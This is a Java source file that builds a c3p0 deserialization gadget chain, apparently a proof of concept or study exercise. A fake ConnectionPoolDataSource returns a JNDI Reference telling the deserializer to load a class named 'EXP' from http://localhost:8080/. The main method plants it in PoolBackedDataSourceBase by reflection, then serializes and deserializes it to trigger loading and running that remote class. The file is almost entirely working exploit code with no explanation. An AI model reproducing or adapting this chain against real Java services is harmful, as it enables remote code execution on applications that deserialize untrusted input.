package c3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import common.Util;
import commonBeanUtils1.ReflectUtil;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

public class Main {
    public static class Foo implements Referenceable, ConnectionPoolDataSource{

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public Reference getReference() throws NamingException {
            return new Reference("Test", "EXP", "http://localhost:8080/");
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }
    public static void main(String[] args) throws Exception {
        PoolBackedDataSourceBase pbd = new PoolBackedDataSourceBase(false);
        ReflectUtil.setField(pbd, "connectionPoolDataSource", new Foo());
        byte[] ser = Util.serialize(pbd);
        Util.deserialize(ser);
    }
}
